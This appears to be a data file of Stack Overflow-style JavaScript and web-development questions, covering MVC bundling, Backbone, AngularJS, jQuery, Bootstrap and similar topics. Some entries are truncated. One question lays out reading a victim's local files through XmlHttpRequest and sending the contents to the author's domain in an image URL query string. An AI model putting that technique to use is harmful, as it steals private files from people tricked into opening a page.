Cassette bundles vs MVC4 beta bundles," I am currently working on a prototype ASP.NET MVC 3 solution that will be used as a base for several project rewrites (from web forms).One of the goals that I have is to implement some script management across application as opposed to none that we currently have.MVC 3 has a flaw IMHO: if you need specific script specified on a partial view or template view - you might end up either losing control over where script block is located in rendered HTML or having to specify every single dependent javascript file on the parent View.I have been seriously considering using http://getcassette.net/ as a framework to resolve described issue. However, last release of MVC4 beta made me doubt myself again: MVC's Bundles look really similar to Cassette's Bundles and I am confused again:Should I implement cassette now and than migrate to MVC4 bundles?Should I implement some simplified script manager myself (sth. like Scripts helper class in MVC4 preview) and then migrate to MVC4Or should I integrate cassette into project and hope that it will be more future-proof than MVC's imlementation (I really don't like this option right now just because of sheer number of dependencies cassette comes with).I have no experience with Cassette itself and find it really hard to make the comparison myself and would appreciate any answers or hints.EDIT:I just figured that there is another option: installing beta nuget package for MVC bundling: https://nuget.org/packages/Microsoft.Web.OptimizationCONCLUSION:The more I look into MVC4 bundle implementation the bigger difference I notice: MVC4 bundles do not address MVC3 issue described above - they just do bundling & minification. Moreover, cassette is not just capable of rendering script tags in a specific place it is also capable of ordering them in correct order which is not trivial.So at the moment I am not satisfied with either of solutions and I will try to come up with my own minimalistic implementation hoping that situation will improve in the future.But if you are not afraid of adding 5+ dependencies and bunch of web.config changes into your project - go for cassette. I hope it will be updated at some point to utilize MVC bundling inside to reduce functionality duplication, and hopefully, will become more modular.UPDATE:As of version 2.0 of Cassette it is no longer necessary to include coffee script and other features of Cassette if you just need bundles and js dependency resolution. So at this point Cassette is a clear winner to me. <code> ",Cassette bundles vs MVC4 bundles

Is ninja.yell COPIED to yell and NOT referenced or these kind of NAMED function expression have global scope in some scenario's like this ? Same thing happens in #13 and #14, only difference is that function is named in #14 and unnamed in #13 plus ninja = {} in #14 and ninja = null in #13. Is there any hidden concept about NAMED FUNCTION EXPRESSIONS that I am missing which makes #14 workable and #13 not workable. <code>  var samurai = { yell: ninja.yell }; var ninja = {};assert( samurai.yell(4) == ""hiyaaaa"", ""The method correctly calls itself."" ); ",How does naming an anonymous function in JavaScript make a difference?
Javascript get custom button's text value," I have a button that is defined as follows : And I'm trying to grab it based on the text value. Hhowever, none of its attributes contain the text value. It's generated in a pretty custom way by the look of it.Does anyone know of a way to find this value programmatically, besides just going through the HTML text? Other than attributes?Forgot one other thing, the id for this button changes regularly and using jQuery to grab it results in breaking the page for some reason. If you need any background on why I need this, let me know.This is the JavaScript I am trying to grab it with: It only comes back with the three attributes that are defined in the code.innerHTML, text, and textContent - all come back as null. <code>  <button type=""button"" id=""ext-gen26"" class="" x-btn-text"">button text here</button> var all = document.getElementsByTagName('*'); for (var i=0, max=all.length; i < max; i++) {var elem = all[i];if(elem.getAttribute(""id"") == 'ext-gen26'){ if(elem.attributes != null){ for (var x = 0; x < elem.attributes.length; x++) { var attrib = elem.attributes[x]; alert(attrib.name + "" = "" + attrib.value); } }}};",JavaScript: get custom button's text value

I would like to pause execution at the beginning of that function, so that the execution is paused while the H1 element is still black.How to do it on the main page:This is trivial. Simply load the page, open the dev tools of the browser, select the common.js file, and set a break-point at the first line of the function. Now, reload the page. The break-point will persist the reload, and execution will be paused.How to do it on the nested page:Now, in Chrome and Firefox (Firebug), the break-point that was set above (for the main page), will also work for the nested page. Both pages use the same JS file, and setting a break point in that file will apply for both pages automatically. Unfortunately, this rule does not apply to IE. And even worse, even if I set the break point subsequently, and then reload the iframe only, the break-point will not persist. So, I don't know how to pause execution for the nested page in IE.

attaching backbone.js to existing elements," I am implementing my first actual non-tutorial Backbone app, and have 2-ish questions about an aspect of using using backbone.js that isn't settling very well with me, which relates to injecting a view's rendered el into the DOM vs. using an existing element for el. I suspect I will provide you all with a few ""teachable moments"" here, and appreciate the help.Most Backbone View examples I see in the web specify tagName, id and/or className, when creating a View and thereby create an el that is unattached from the DOM. They typically look something like: But the tutorials don't always get around to explaining how they recommend getting the rendered el into the DOM. I've seen it a few different ways. So, my first question is: where is the appropriate place to call a view's render method and insert its el into the DOM? (not neccessarily one and the same place). I've seen it done in a router, in the view's initialize or render functions, or just in a root level document ready function. ( $(function () ) . I can imagine that any of these work, but is there a right way to do it?Second, I am starting with some HTML markup/wireframe, and converting html portions to js templates corresponding to backbone views. Rather than let the view render an unattached element and providing an anchor point in the html to stick it in, I feel like its more natural, when there is only going to be one element for a view and it won't be going away, to use an existing, emptied wrapper element (often a div or span) as the el itself. That way I don't have to worry about finding the place in the document to insert my unattached el, which would potentially end up looking like this (note the extra layering): So part of my second question is, for a basically static view, is there anything wrong with using an existing element from the page's HTML directly as my view's el? This way I know its already in the DOM, in the right place, and that calling render will immediately render the view on the page. I would acheive this by passing the already exixting element to my view's constsructor as 'el'. That way, it seems to me, i don't have to worry about sticking it into the DOM (making question 1 sort of moot), and calling render will immediately update the DOM. E.g. Is this an OK way to do it for static views on the page? i.e., there is only one of these views, and it will not go away in any circumstance. Or is there a better way? I realize that there may be different ways to do things (i.e., in a router, in a parent view, on page load, etc.) based on how I am using a view, but right now I am looking at the initial page load use case. Thanks <code>  App.MyView = Backbone.View.extend({ tagName: 'li', initialize: function () { ... }, render: function () { $(this.el).html(<render an html template>); return this; }}); <div id=""insert_the_el_in_here""> <!-- this is all that's in the original HTML doc --> <div id=""the_el""> <!-- i used to be a backbone generated, unattached el but have been rendered and inserted --> <!-- we're finally getting to some useful stuff in here --> </div> </div> <form> <div someOtherStuff> </div> <span id=""myView""> </span></form><script type=""text/template"" id = ""myViewContents""> . . . </script><script type=""application/javascript"">window.MyView = Backbone.View.extend( { initialize: function () { this.template = _.template($('#myViewContents').html()); this.render(); }, render: function () { $(this.el).html(this.template()); return this; }});$(function () { window.myView = new MyView({ el: $('#myView').get(0) });});</script>",attaching backbone.js views to existing elements vs. inserting el into the DOM
bootstrap popover: advanced positioning," I'm trying to position a Bootstrap popover for a trigger that sits on the far top-right corner of a 960px wide web page.Ideally, I'd position it on the bottom and move the arrow with CSS (so the arrow is on the top-right of the popover). Unfortunately the 'placement':'bottom' positioning is not enough, since it will center it below the trigger.I'm looking for solution that will place the popover statically below and on the left of the trigger.  <code> ",How to position a Bootstrap popover?

Is there a more elegant way for resizing a sector path using Raphal JS and SVG?," I am using Raphal for the first time with little svg experience and I need someone who is really knowledgeable with these two to help me.I have created a pie chart with dynamic sectors. The sectors can be resized by dragging on the round buttons. See this fiddle. I have only tested in Chrome and Safari which are the only required browsers.The pie chart is not yet complete. The sectors can overlap. Please ignore this for now.I was faced with problems, when the starting angle of a sector was greater than the ending angle. This is the case when the ending angle goes past the 0/360 mark. To solve this I made use of the path-rotation-parameter. I moved the sector forward while moving the angles back, until the end angle is at 360. You can see this in the fiddle in this function: Although it works nicely, I'm a bit skeptical. Can this be solved without the rotation of the path? I appreciate any help or pointers. <code>  function sector_update(cx, cy, r, startAngle, endAngle, sec) { var x1 = cx + r * Math.cos(-startAngle * rad), x2 = cx + r * Math.cos(-endAngle * rad), y1 = cy + r * Math.sin(-startAngle * rad), y2 = cy + r * Math.sin(-endAngle * rad); var rotation = 0; // This is the part that I have the feeling could be improved. // Remove the entire if-clause and let ""rotation"" equal 0 to see what happens if (startAngle > endAngle) { rotation = endAngle; startAngle = startAngle - endAngle; endAngle = 360; } sec.attr('path', [""M"", cx, cy, ""L"", x1, y1, ""A"", r, r, rotation, +(endAngle - startAngle > 180), 0, x2, y2, ""z""]);}",More elegant way to resize a sector path using Raphal JS and SVG?

Is there a modern sesionStorage alternative that works across subdomains?," We recently switched from cookies to using sessionStorage - the trigger for switching was IE issues.Now, we're discovering that sessionStorage doesn't work across sub-domains - the storage of www.site.com is isolated from that of site.com.

HTML5: Animate page reflow?," I am switching the contents of divs (fading old contents out, then fading new contents in) and because they are slightly different contents, the moment they change there is a jarring reorganization of everything below them. My question is, is there a way to make this movement smooth? I suspect that pretty much the only feasible way to do this is to use javascript to determine ahead of time what the heights (in my case I only deal with blocks where the vertical alignment shifts) of the starting and ending elements are, and assign these values directly. Once I do this I am sure CSS3 transition will apply a pleasant animation. Is there perhaps a way to get this without specifying explicit dimensions?

Can you add custom functions to a hijacked JavaScript Array?," This question is related to What are the best practices to follow when declaring an array in Javascript?

Cooper's requirements?Note: D.B. even wrote a test fiddle to help make sure solutions meet his requirements...what a guy!Update:For those of you who like a challenge: please try to find an unhijackable cross-browser solution to this problem.

Thus far, it looks like there may be a browser-specific solution to this (see Bergi's comment on his answer, and let us know if you find a way to hijack it in FF), but it is unclear at this point if there is a cross-browser solution to this. <code>  Array = function(){ alert('Mwahahahaha');}; Array.prototype.coolCustomFunction = function(){ alert('I have ' + this.length + ' elements!

two-way filtering in angular.js?," One of the interesting things AngularJS can do is apply a filter to a particular databinding expression, which is a convenient way to apply, for example, culture-specific currency or date formatting of a model's properties. It is also nice to have computed properties on the scope. The problem is that neither of these features work with two-way databinding scenarios - only one-way databinding from the scope to the view. This seems to be a glaring omission in an otherwise excellent library - or am I missing something?In KnockoutJS, I could create a read/write computed property, which allowed me to specify a pair of functions, one which is called to get the value of the property, and one which is called when the property is set. This allowed me to implement, for example, culture-aware input - letting the user type ""$1.24"" and parsing that into a float in the ViewModel, and have changes in the ViewModel reflected in the input. The closest thing I could find similar to this is the use of $scope.$watch(propertyName, functionOrNGExpression); This allows me to have a function invoked when a property in the $scope changes.

"Odd ""shaking"" effect when animating width with jQuery"," I'm animating the width of a li element using jQuery in a simple snippet of code. I'm using hover() as the handler and .animate() to animate the width. Here is my code. The code is really really simple and works but with one very odd quirk in Chrome. When animating the elements in and out, the li elements ""shake"" as if they're really cold and were shivering. You can see the behavior here in a live example: http://missmd.org/ (edit: bug is now fixed)I've animated a bunch of stuff before with jQuery and never seen this behavior. Is there any explanation for why it occurs and how I can get around it? I'm wondering if it's because I've floated the elements to the right and am animating to the left. The bug is maddening and detracts from the overall presentation a lot (at least to me). Anyone else seen this before?Edit to clarify: it's not the actual li element that ""shivers"" it's the text within it that shakes slightly but noticeably from left to right very quickly as the animation runs. I'm stumped.Edit two: after fiddling with the CSS a bit now I can only reproduce the effect in Chrome (21.0.1180.60 beta-m for me). In Firefox it works as intended. It also works great in IE. Very ironic that Chrome (usually great with this stuff) is giving me trouble now. Pulls hair out, checks sanityHere is my HTML to help get to the bottom of this. We have reproduced the problem in ChrisFrancis' jsFiddle. I'm completely stumped. This could also be a bug in Chrome/V8 JS engine and there's nothing we can do about it.  <code>  $('li').each(function() { //store the original width of the element in a variable var oldWidth = $(this).width(); $(this).hover( function() { //when the mouse enters the element, animate width to 900px $(this).animate({width: '900px'}, 600, 'linear') }, function() { //when the mouse leaves, animate back to the original width $(this).animate({width: oldWidth}, 350, 'linear') } );}); <nav> <ul class=""nav""> <li class=""one""> <a href=""homeandnews/""> <span class=""title"">Home and News</span> <br/> <span class=""subtitle"">Learn more about me and read general updates!</span> </a> </li> </ul><nav>","Odd ""shaking"" effect when animating width with jQuery (only in Chrome!)"

If power failes in Online examination then how do we update the time left when he again log in to the portal?," I am working on a project Online examination just to gain knowledge. There can be a case of power failure and when a candidate logs in again, then the time wasted during power failure must be given. But in my javascript code, the exam ends after exact 2 hours corresponding to server time(AJAX is used here). After time ends, the student is redirected to home page. I have thought of a solution but I dont find a start to implement it. As the session is maintained, so I can maintain the time he used from 2 hours and can be stored in database. when he relogin then that particular row which corresponds to him can be checked and the time can be updated.But I am not able to implement it. Please tell me if there is another solution to it or the direction in which I am thinking is right or wrong. The exam clock resumes from the start of 2 hours. It doesn't resume from the time which was ticking when the power failure was there. Its the same thing whether a power failure occurs or a candidate logs back again in this case atleast.

get information from file system of a user with javascript in html file," Let's talk about security. It seems to me, theoretically, I can get information from file system of a user with some script, if the user opens html file with it (opens from his file system, not from network). Look at the code:info.txt: index.html: Some browers (firefox, for example) allow you to get files from file:// through XmlHttpRequest, so if I guess path to the file, then I can get it's content by ajax. And then I can dinamically add img tag with src leading to my domain with parameters in query string. And browser make a request obediently GET ?data=my%20info%0A domain.com. And on the server side I can parse query string and get the data.Am I right I can do this? Am I right I can get user's data from his computer if he opens my html file? So I can just say: ""Hey, friend, check out this file!"" (with 2 restrictions: user should use firefox or something else with similar configuration, and I cannot get files user cannot access because of access rights).UPDATED:If it is possible, then why it is possible? Why do they allow you to do such things. Why there is no confirm dialogs or something.UPDATED 2:It will be great if someone make a review about this issue.

computing a loci mesh," I want to avoid my player being able to stand inside walls. Each game tick my player moves some small distance and/or rotates.TL;DR please provide a variant of the classic line-segment->-triangle intersection algorithm which returns near-misses too, or solve the problem in another way The line segment intersects if it passes within a given distance of the triangle. There's a lot of subtlety to the problem, such as the triangle's locus corners being rounded and if the line segment is tangential to the triangle.I have the usual ray/triangle intersection code.However, a ray is a very poor approximation of a moving player! I have problems with the player's center missing edges but the player mesh passing through them.How do you efficiently determine when and where a player collides with walls and obstacles in a 3D environment?One general approach would be to have near-miss triangle code, where the ray is a ball-capped cylinder.The general solution I've tried making is to imagine the player is a sphere; turning this inside-out, I have tried to make a mesh that is radius bigger than the actual walls and do collision rays on that. I want to compute a mesh that is some fixed distance in front of this mesh, i.e. a cube would expand to be a slightly larger cube with rounded edges and corners. (My meshes are rather less regular than a cube. Imagine a mesh representation of the inside of a boiler room, and imagine trying to compute a mesh that is 20 cm from all walls and boilers and door-frames and such in that room.) Here is a simple mesh around a barrel:For each face I can compute the surface normal; this is how I know which way is 'out'.My brainstorming makes me imagine multiplying each face's normal by the fixed distance and then emitting a triangle with the corresponding offset.This would however leave holes at the edges and would perhaps(?) cause some edges to pass through very tight acute corners?I can also imagine joining each edge as ball-ended cylinders too and so on.The approach I used for the barrel above is to compute the average normal of all faces sharing a vertex and then multiply that by the collision radius. It doesn't cope with acute angles well, and what to do if a vertex is falsely-shared between faces that are on opposite sides?I will be computing this mesh, and then performing ray intersections, in Javacsript. So performance is a consideration too. A too fine detailed mesh will be expensive to do collision detection upon.How can you effectively compute a good-enough loci mesh? Or do loci-aware fuzzy triangle intersection? Or is there a better way to do collision, and can it somehow model that things move in arcs rather than straight lines? <code> ",colliding with  a loci mesh

best way to count absolute array length in javascript," Just wondering, when you use array.length it gets the last index value and adds one. What if you have an array, that is defined this way for some reason: What is the absolute best way to get the true length of this Array?

Sort accented letters and other variants in predefined way," In Finnish we sort W after V (as in English) but because W is not a native Finnish letter, it is considered as a variant of V, which is sorted as it were equal to V, but in cases where the only difference between two words is that V is W, then V-version is sorted first. An example enlights the proper order: In Finnish V and W are collated as A and . is sorted like A, but in cases where it is the only difference, the unaccented one comes first. The same rule is for all other accented letters, but the , and are collated separately after Z.Question: What would be the best algorithm to sort this like variants in a predefined way? ( eg. [Watanen, Vatanen, Virtanen] to [Vatanen, Watanen, Virtanen] )?Addition: The question is relevant to extend to cover also other variants in the way they are defined in http://cldr.unicode.org/index/cldr-spec/collation-guidelines, because the technique would in a great probability be the same and the answers to this question benefit the widest possible audience and sort algorithms can be made compatible with collation rules defined in Unicode CLDR. The Unicode CLDR defines three levels of differences between letters: primary level (base letters), secondary level (accented letters) and tertiary level (character case).I have thought some kind of array preparation like in numerical sort where we could pad all numbers with zeros to make them comparaple as strings. An example: Array [file1000.jpg, file3.jpg, file22.jpg] can be prepared to make it comparable as strings by padding with zeros this way: [file1000.jpg, file0003.jpg, file0022.jpg]. Because of preparation of array, we can sort it very fast using native Array.sort().The target language is Javascript, which lacks support for collation based sorts, so the custom sort function have to be made self.

How do i seperate JavaScript View/Logic code properly," I receive JSON objects from a websocket with update/create/delete flags. Based on this information, I either update, create or delete HTML elements and bind callbacks. This can affect multiple HTML elements.My current approach was to put everything into specific objects which handle HTML generation via jquery e.g.: and bind event listeners. But with the addition of more and more code it got really messy and now im looking for a proper way to seperate the code.Are there any ideas on how to do this properly? Frameworks?

Online gaming. Or something faster then ajax for sending/receiving data," I'm making this as short as I can.What I've done so far:The game I have will be running with JavaScript using setTimeout or setInterval. It's not flash or anything special. What I have made so far as like a test run (so you can understand better), is pretty much loop Ajax to keep sending requests to a PHP page as fast as it can, which then PHP reads the $_GET in the url from the request, then PHP edits a file called p1.html with the $_GET, which is simply player 1's x and y-axis coordinates. So in player 2's browser, it pretty much did what I said above, and now when it receives the Ajax request, it will receive the coordinates of player 1. So JavaScript does what it does, and moves player 1 on player 2's browser. That's what I already made myself, and I tested it and yes it works and yes it lasts forever when I fixed all the bugs and stuff.Saying that, that's what I've made so far, but this isn't fast enough if I wanted like a online fighting game or a real time side scrolling game. So that's what I need help with. I know a lot of stuff on w3schools.com, but I just don't know how to get this job done. That's probably it. I just need browser 1, to get data to browser 2, something like this ""1,100,200"" or a little longer actually, and have browser 2 read that data as a variable in JavaScript (anything like x=""received data"";), and that's just it. JavaScript will do the rest.I'm sure I can program everything I need myself, but for sending data from point A to point B like 50 times a second, I just don't know anything about it. Not even a name. And last, urls and examples would be very nice (to be clearer).

In particular, when the calendar is on display, I want the Tab key to select the highlighted date and move to the next form field.I've got the key handler working – it selects the highlighted date and closes the calendar – but I can't get it to tab to the next field.Do I have to work out what the next field is from the tab order and try to set its focus? That seems rather convoluted. Or can I fire some event to get my control to tab to the next field automatically (i.e. capture the Tab keypress in the calendar and process it, as I am doing, but then forward it to the underlying date field)?Edit: In summary, is there an Ext (or, at least cross-platform) way to fire a keyboard event at a particular form field? <code> ",Programmatically tab to next control in Ext JS

Why are my JS object properties being overwritten by other instances," I created an object like the following. When I call the setProp method, I get the following. I then created another object that inherits from BaseObject like this. When I do the same, I get a result I wasn't expecting. I don't know why.

Using Chrome debugger with an MVC partial view loaded with AJAX," I have an ASP.NET MVC 4 view that dynamically loads two nested partials into <div> elements via JQuery AJAX calls. Each of the partials has a pretty big pile of Javascript of its own. To get it all working, I currently have all of the Javascript in the success of each AJAX call: Since there are two of these partials and each requires hundreds of lines of Javascript, the main view file is getting difficult to manage. I'd love to put all of this script code into a separate .js file, but I'm still new enough to Javascript that I rely heavily on Chrome's script debugging tools, and I'm having trouble figuring out how (and if) I can get this script file to load. I've tried:Adding a script include to the partial file. In this case, thepartial's Javascript still does not load at runtime, and apparentlyhaving includes in a partial view isn't a good idea anyway.Adding a script include to the main view. This doesn't work. Noneof the partial's Javascript attaches correctly, which makes sense ona synchronization level.Is there any way that I can have a separate Javascript file for an AJAX loaded partial and still be able to debug the partial on the client? More importantly, where do I put all of this Javascript for AJAX loaded partial views? <code>  function LoadPartial(someImportantId) { $.ajax({ url: '@Url.Action(""LoadThePartial"")' + '?id=' + someImportantId, type: 'POST', async: false, success: function (result) { $(""#partialContainerDiv"").html(result); //here there be great piles of javascript } });}",Javascript and MVC4 partial views loaded with AJAX

Backbone.js Model Isn't Updated after Save() function executes," I'm working on a web application that is powered by a restful API written with Python's CherryPy framework. I started out writing the user interface with a combination of jQuery and server side templates, but eventually switched to Backbone.js because the jQuery was getting out of hand.Unfortunately, I'm having some problems getting my models to sync with the server. Here's a quick example from my code: As you can probably tell, the idea here is to register a new user with the service. When I call u.save();, Backbone does indeed send a POST request to the server. Here are the relevant bits:Request: Response: As you can see, the server successfully processes the request and sends back an id and a value for created. But for some reason, when my code calls console.log(u.id);, I get null, and when my code calls console.log(u.created);, I get undefined.tl;dr: Why isn't Backbone.js persisting changes to my objects after a call to save()?Edit: I've modified the above code so that the model properties are accessed using the get function in a success callback. This should solve any concurrency problems with the original code.I've also added some console logging in the model's parse function. Oddly enough, each of these is undefined... Does that mean that Backbone.js is failing to parse my response JSON?Edit 2:A few days ago, I found out that issue was actually a custom header that I was adding to every request to enable HTTP Basic Authentication. See this answer for details. <code>  $(function() { var User = Backbone.Model.extend({ defaults: { id: null, username: null, token: null, token_expires: null, created: null }, url: function() { return '/api/users'; }, parse: function(response, options) { console.log(response.id); console.log(response.username); console.log(response.token); console.log(response.created); return response; } }); var u = new User(); u.save({'username':'asdf', 'token':'asdf'}, { wait: true, success: function(model, response) { console.log(model.get('id')); console.log(model.get('username')); console.log(model.get('token')); console.log(model.get('created')); } });}); Request URL: http://localhost:8080/api/usersRequest Method: POSTRequest Body: {""username"":""asdf"",""token"":""asdf"",""id"":null,""token_expires"":null,""created"":null} Status Code: HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 109Response Body: {""username"": ""asdf"", ""created"": ""2013-02-07T13:11:09.811507"", ""token"": null, ""id"": 14, ""token_expires"": null}",Adding HTTP Basic Authentication Header to Backbone.js Sync Function Prevents Model from Being Updated on Save()

"Form with target=""_blank"" behavior changed in IE 10"," I have an app that uses something like the following code to open a dynamically generated report in a new tab. (I've mocked out the parameters for the sake of a demo.) The pdf parameter us just the URL to the script that generates the PDF. The reason for the form manipulation is to get the parameters POSTed to the script rather than as GET parameters.In IE 8 and below, Chrome, Firefox, etc., this will do one of two things:If the browser can read PDFs (via built-in functionality or a plugin), it will open a new tab with the report, which is the desired behavior.If the browser can't read PDFs, it will open the new tab, immediately close it, and download the file.It seems that #2 has changed in IE 9 and above. It will open a new tab, but it yields only a blank screen until the user goes back to the original tab, clicks ""Open"" or ""Save"", and then the PDF downloads as expected. It's a very confusing interface.I suppose one way to work around this would be to generate a temporary PDF file, and then simply window.open() to it. Are there other ways to tweak the behavior of this functionality? Or is there a recommended practice that I've not run across?(Note: This isn't at all PDF specific; any file that the browser may download instead of display natively seems to be problematic.)EDIT: Looks like I'm further behind the curve than I realized. It appears that this also occurs in IE9, and I'd never noticed as I never tried it without the PDF plugin installed or with another file type.Interestingly, the above code works like I'd expect if I remove the input field from the form. I'm not sure why the browser would treat that any differently. Of course, in my case, I need the input to POST data to my script.EDIT 2: Silly mistake. input is self-closing. Fixed.EDIT 3: Here are some screenshots to better explain the issue. I'm using this JSBin for testing. I have an onclick event to trigger the Javascript function above.The process starts on the first tab.Then, once you click the text, a new tab opens. But it's blank!And it turns out that the original (now hidden) tab has a message asking whether to open or save the file.Clicking ""Open"" or ""Save"" will open the file just fine. But the process is terribly confusing, and inconsistent with other browsers.EDIT 3: One step forward, one back. If I use window.open() to create a new window, and then programmatically set the form.target to the name of that window, I can at least get the Open/Save message in the opened tabthough I'd much prefer it to immediately close the tab like other browsers. Worse, with that technique, the new tab no longer immediately closes. Perhaps there's another technique? <code>  function gblPDFWdw(pdf) { var formDiv = document.createElement(""div""); formDiv.innerHTML = ""<form method=post action='"" + pdf + ""' target='_blank'><input type=hidden id=test name=test value='test'></form>""; var form = formDiv.firstChild; document.body.appendChild(form); form.submit(); form.parentNode.removeChild(form);}","Form with target=""_blank"" behavior changed in IE 9 and 10"

Why does the Segment.io loader script push method names/args onto a queue which then gets overwritten?," I've been dissecting the following code snippet, which is used to asynchronously load the Segment.io analytics wrapper script: It's well commented and I can see what it's doing, but I'm puzzled when it comes to the methodFactory function, which pushes details (method name and arguments) of any method calls made before the main analytics.js script has loaded onto the global analytics array.This is all well and good, but then if/when the main script does load, it seemingly just overwrites the global analytics variable (see last line here), so all that data will be lost.I see how this prevents script errors in a web page by stubbing out methods which don't exist yet, but I don't understand why the stubs can't just return an empty function: What am I missing? Please, help me understand! <code>  // Create a queue, but don't obliterate an existing one!var analytics = analytics || [];// Define a method that will asynchronously load analytics.js from our CDN.analytics.load = function(apiKey) { // Create an async script element for analytics.js. var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true; script.src = ('https:' === document.location.protocol ?

Bootstrap collapsible with angular," I'm building a small app and I'm using AngularJS. Inside the app I need a collapsible element and using Twitter Bootstrap would be as easy as adding the library and some tags on my target element and the trigger. But I'm trying not to load other external libraries like bootstrap or any other, so I was trying to achieve the same behavior with Angular : As you can see I'm trying to transition the height ( as the element has a transition on the height ) and in the end just add the class in. But that isn't working very well because if I'm listening on the transition end it will trigger on any transition end inside that element.I would need some help with this, how can I rewrite the bootstrap collapsible just with angular ? I don't need the events that bootstrap has like on shown, hidden or show, hide, I just need to trigger a simple collapse of the element with transition and keep my elements height dynamic ( I don't want a fixed height, otherwise I would just use CSS to achieve the collapse ). I just need to be pinpointed in the right direction :) <code>  $scope.collapse = function(target) { var that = angular.element(document).find(target), transitioned = { 'WebkitTransition' : 'webkitTransitionEnd', 'MozTransition' : 'transitionend', 'OTransition' : 'oTransitionEnd otransitionend', 'msTransition' : 'MSTransitionEnd', 'transition' : 'transitionend' }, _transitioned = transitioned[ Modernizr.prefixed('transition') ], height = that.outerHeight(true); if (angular.element(that).hasClass(""in"")) { that.height(0); } else { that.height(height); }; that.on(_transitioned, function() { that.toggleClass(""in""); }); };",Something like Bootstrap collapsible with angular

Is Angular.js Just for Single Page Applications (SPA)," We are looking at options to build the front end of an application we are creating and are trying to evaluate a tool that will work for us and give us the best platform to move forward.This is a Node.js project. Our initial plan was to use Express and go down that route, but we decided that before we kick off this stage it might be best to review what is out there. Our application has several areas which we don't believe fit the single-page model in that they are related from an application perspective, but not from a view one.We have seen a few of the frameworks we could use to build out the client like Backbone.js, Meteor, etc. and also AngularJS.This may be a fairly obvious question, but we cannot seem to decipher if AngularJS is purely for single-page application or it can be used for multi-page applications like Express for instance.UPDATE 17 July 2013Just to keep people in the loop, I will be updating this question as we go through the process. We are going to build everything together for now, and we will see how well that performs. We have reached out to a few people who are more qualified with AngularJS than us and posed the question regarding splitting up larger applications that share context, but may be too large working on a single page.The consensus was that we could serve multiple static pages and create AngularJS applications that work with only those pages, effectively creating a collection of SPA and linking those applications together using standard linking. Now our use case is very specific as our solution has several applications, and as I said we are going to try the single code base first and optimise from there.UPDATE 18 June 2016 The project fell of a cliff, so we never got round to getting too much done. We have picked it up again recently, but are no longer using angular and are using React instead. We are still using the architecture outlined in the previous update, where we use express and self contain apps, so for example, we have a /chat route in express that serves up our React chat app, we have another route /projects that serves up the projects app and so on. The way we are kinda looking at it is each app is an aggregate root in terms of its feature set, it needs to be able to standalone for it to be considered an app in itself. Technically, all the information is out there, its just basic express and whatever flavour of client side app building goodness you want to use. <code> ",Is AngularJS just for single-page applications (SPAs)?

How does jQuery allow it's constructor to be a function with it's prototype acting as an additional function?," How would jQuery allow its constructor to act as a function accepting arguments meanwhile its constructor also acts as a function accepting arguments?I am a bit new to JavaScript, so excuse me if this is a noob question, (I have looked at the source but it's hard to try to dissect).Anyway, as an example $(document).ready(<args>); Both the constructor $() and the prototype ready() act as a function. How? Because if I try this: I get an error Uncaught TypeError: Object[object global] has no method 'ready'  <code>  var $ = function( selector ) { if(selector == document) { return document; }};$.prototype = { constructor: $, ready: function( args ) { if( isDomReady ) { args.apply( document ); } else { window.onload = args; } }};var isDomReady = ( document.addEventListener || document.readyState == (""complete""|""loaded""|true|4) || document.onreadystatechange() ) ? true : false;$(document).ready(function() { alert(""Wibbles!"") });",jQuery prototype and constructor function chaining

window.onpopstate on page load," I'm playing with window.onpopstate, and there is a thing that annoys me a little bit: Browsers tend to handle the popstate event differently on page load. Chrome and Safari always emit a popstate event on page load, but Firefox doesn't.sourceI tested it, and yeah, in Chrome and Safari 5.1+ the popstate event is fired on page load, but not in Firefox or IE10.The problem is, that I want to listen only to popstate events where user clicked the back or forward button (or the history was changed via javascript), but don't want to do anything on pageload.By other words I want to differentiate the popstate event from page load from the other popstate events.This is what I tried so far (I'm using jQuery): Basically I try to bind my listener function to popstate late enough to be not bound on page load, only later.This seems to work, however, I don't like this solution. I mean, how can I be sure that the timeout chosen for setTimeout is big enough, but not too big (because I don't want it to wait too much).I hope there is a smarter solution! <code>  $(function() { console.log('document ready'); setTimeout(function() { window.onpopstate = function(event) { // Do something here }, 10);});",How can I ignore window.onpopstate on page load?

"AngularJS - What are ""decorators"" and how are they used?"," I'm curious what exactly decorators are in AngularJS. There isn't much information online for decorators save for a blurb in the AngularJS documentation and a brief (albeit interesting) mention in a youtube video.As the Angular guys put it a decorator is: Decoration of service, allows the decorator to intercept the service instance creation. The returned instance may be the original instance, or a new instance which delegates to the original instance.I don't really know what that means, and I'm not sure why you would separate this logic from the service itself. For example if I wanted to return something different under different conditions I would just pass different arguments to the relevant functions or use another function sharing that private state.I'm still kind of an AngularJS noob so I'm sure it's just ignorance and/or bad habits I've picked up. <code> ","What are ""decorators"" and how are they used?"

How enable local html page to use filesystem api?," I'm writing an HTML5 app to run in Chrome but it will be on the local filesystem (so they'll start it by double-clicking an html file).

Setting a div to display:none; using javascript or jquery," I have a really quick question that should be an easy answer.I have a mobile navigation menu that uses jQuery to ""drill down"" menu levels. Each time a level is loaded, the jQuery determines the menu's height, and sets it accordingly.I am using the following script on a button to toggle show and hide the main menu based on the current page: In order for the menu to start ""closed"" on certain pages, I know that I must give the css value of display:none; to the containing div. This is all working fine with one small problem.When I initially hide the menu, the jQuery drilldown menu plugin detects that it is hidden, and sets the menu height to 0px. When I toggle the menu on a page that had the menu initially hidden, all the other content in the pane toggles correctly, but the menu itself is stuck at a 0 height.In my brain, the obvious answer to this problem would be to hide the containing menu div ,via javascript, after the menu has been loaded and it's height set. Does this sound correct?Could anyone provide me with a little script to do this? I am a complete and utter noob with js. Does anyone else have a different recommendation as to how to handle this issue?Thanks for your time!AlexUPDATE!JS fiddle for the issue here: http://jsfiddle.net/fyyG2/17/* <code>  <script type=""text/javascript""> (function ($) { $(""a.BNnavTrigger"").click(function (event) { event.preventDefault(); $(""div.drill-down-wrapper"").slideToggle(""9000""); }); })(jQuery); </script>",Setting a div to display:none; using javascript or jQuery

